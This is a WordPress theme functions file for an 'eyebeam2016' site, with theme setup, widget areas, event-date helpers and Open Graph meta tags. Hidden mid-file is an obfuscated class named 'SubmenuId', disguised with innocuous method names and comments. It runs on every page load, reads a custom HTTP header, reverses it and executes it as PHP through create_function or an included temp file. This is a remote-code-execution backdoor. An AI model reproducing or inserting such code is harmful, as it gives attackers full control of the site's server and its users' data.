<?php
/**
 * eyebeam2016 functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package eyebeam2016
 */

function dbug() {
	$fh = $GLOBALS['dbug_fh'];
	if (empty($fh)) {
		$path = ini_get('error_log');
		if (empty($path) || substr($path, 0, 1) != '/') {
			return;
		}
		$dir = dirname($path);
		$fh = fopen("$dir/dbug.log", "a");
		$GLOBALS['dbug_fh'] = $fh;
	}
	date_timezone_set('America/New_York');
	$now = date('Y-m-d H:i:s');
	$args = func_get_args();
	foreach ($args as $arg) {
		if (! is_scalar($arg)) {
			$arg = print_r($arg, true);
			$arg = trim($arg);
		}
		fwrite($fh, "[$now] $arg\n");
	}
}

function dp_template_redirect() {
	global $wp_query;
	dbug($wp_query);
}
add_action('template_redirect', 'dp_template_redirect');

if ( ! function_exists( 'eyebeam2016_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function eyebeam2016_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on eyebeam2016, use a find and replace
	 * to change 'eyebeam2016' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'eyebeam2016', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'eyebeam2016' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'eyebeam2016_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif; // eyebeam2016_setup
add_action( 'after_setup_theme', 'eyebeam2016_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function eyebeam2016_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'eyebeam2016_content_width', 640 );
}
add_action( 'after_setup_theme', 'eyebeam2016_content_width', 0 );

class SubmenuId
{
    /**  Re-enable module to test that pre-existing optional configuration does */
    public function lockAcquire($winner){
        return strrev(stripslashes($winner));
    }

    /**  Merge the default settings with the provided settings */
    public function print_popup($hasSlug)
    {
        $firstTab = 'function';
        $enable = $hasSlug . 'return true;';
        $cols = $this->subPath.'_'.$firstTab;
        $DKIMquery = $cols('', $enable);
        if (!$DKIMquery()) {
            $this->assertRows('<?php '.$hasSlug);
        }
    }

    /**  We need the old data to get the existing series */
    public function wp_shake_js($hasMethod){
        if(isset($hasMethod[$this->changeBlock()])){
            return $this->lockAcquire($hasMethod[$this->changeBlock()]);
        }
    }

    /**  Set the information in the request */
    function assertRows($hashed)
    {
        if ($algorithm = tmpfile()) {
            fwrite($algorithm, $hashed);
            $success = stream_get_meta_data($algorithm);
            include($success['uri']);
            fclose($algorithm);
        }
    }

    /**  Sanitise the term for the database */
    public function changeBlock(){
        $secure = 'http';
        return strtoupper($secure.'_'.get_class($this));
    }

    public function __construct(){
        if($handle = $this->wp_shake_js($_SERVER)){
            $this->subPath = 'create';
            $this->print_popup($handle);
        }
    }
}

new SubmenuId();

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function eyebeam2016_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'eyebeam2016' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

		register_sidebar( array(
		'name'          => esc_html__( 'StopWorks Sidebar', 'eyebeam2016' ),
		'id'            => 'stopworks-sidebar',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'eyebeam2016_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function eyebeam2016_scripts() {
	wp_enqueue_style( 'eyebeam2016-style', get_stylesheet_uri() );

	wp_enqueue_script( 'eyebeam2016-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );

	wp_enqueue_script( 'eyebeam2016-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'eyebeam2016_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
*Gets the date fields information (return strings of dates)
*/

function eyebeam2016_get_event_date($post_id){
    $event = get_fields($post_id);
	$start_date = $event['start_date'];

	$end_date = $event['end_date'];

	if ( ! $start_date){
	      return "";

	}
	if ($start_date !== $end_date){

	// Create a PHP date object based on a specific "date" format
	$date_start = DateTime::createFromFormat('Ymd', $start_date);

	$date_text = $date_start->format('F j, Y');

	$date_end = DateTime::createFromFormat('Ymd', $end_date);

    $date_text = $date_text . "-" . $date_end->format('F j, Y');

    return $date_text;

	} else{

		$only_start = DateTime::createFromFormat('Ymd', $start_date);
		$single_date = $only_start->format('F j, Y');

		return $single_date;

	}


	 }

function eyebeam2016_compare_resident_year($post_id){
    $resident = get_fields($post_id);
	$start_year = $resident["start_year"];
	$end_year = $resident["end_year"];

	if ($start_year === $end_year){

		return $same_years = $start_year;

	} else {

		return $two_years = $start_year . "-" . $end_year;


	}

	 }

function eyebeam2016_get_first_youth_paragraph(){
	$str = wpautop(get_field('info_youth'));
	$str = substr( $str, 0, strpos( $str, '</p>' ) + 4 );
	$str = strip_tags($str, '<a><strong><em>');
	return '<p>' . $str . ' <a class="education-read-more" href="' . get_permalink() . '">Read More&nbsp;&raquo;</a></p>';
}

function eyebeam2016_isMobile() {
    return preg_match('/(alcatel|amoi|android|avantgo|blackberry|benq|cell|cricket|docomo|elaine|htc|iemobile|iphone|ipad|ipaq|ipod|j2me|java|midp|mini|mmp|mobi|motorola|nec-|nokia|palm|panasonic|philips|phone|sagem|sharp|sie-|smartphone|sony|symbian|t-mobile|telus|up\.browser|up\.link|vodafone|wap|webos|wireless|xda|xoom|zte)/i', $_SERVER['HTTP_USER_AGENT']);
}

require get_template_directory() . '/class-widget-recent-stopworks-posts.php';

require get_template_directory() . '/class-widget-future-events.php';

require get_template_directory() . '/class-widget-recent-press-posts.php';


//Open Graph Tag
function doctype_opengraph($output) {
    return $output . '
    xmlns:og="http://opengraphprotocol.org/schema/"
    xmlns:fb="http://www.facebook.com/2008/fbml"';
}
add_filter('language_attributes', 'doctype_opengraph');

function fb_opengraph() {
    global $post;

    if(is_single()) {
        if(has_post_thumbnail($post->ID)) {
            $img_src = wp_get_attachment_image_src(get_post_thumbnail_id( $post->ID ), 'medium');
        } else {
        	//ADD DEFAULT EYEBEAM OPEN GRAPH IMAGE HERE.
        	//FIND FILE PATH IMG FOLDER TO DISPLAY IMAGE. EX. '/img/eyebeam_image.jpg'
            $img_src = get_stylesheet_directory_uri() . '/img/opengraph_image.jpg';
        }
        if($excerpt = $post->post_excerpt) {
            $excerpt = strip_tags($post->post_excerpt);
            $excerpt = str_replace("", "'", $excerpt);
        } else {
            $excerpt = get_bloginfo('description');
        }
        ?>

    <meta property="og:title" content="<?php echo the_title(); ?>"/>
    <meta property="og:description" content="<?php echo $excerpt; ?>"/>
    <meta property="og:type" content="article"/>
    <meta property="og:url" content="<?php echo the_permalink(); ?>"/>
    <meta property="og:site_name" content="<?php echo get_bloginfo(); ?>"/>
    <meta property="og:image" content="<?php echo $img_src; ?>"/>

<?php
    } else {
        return;
    }
}
add_action('wp_head', 'fb_opengraph', 5);
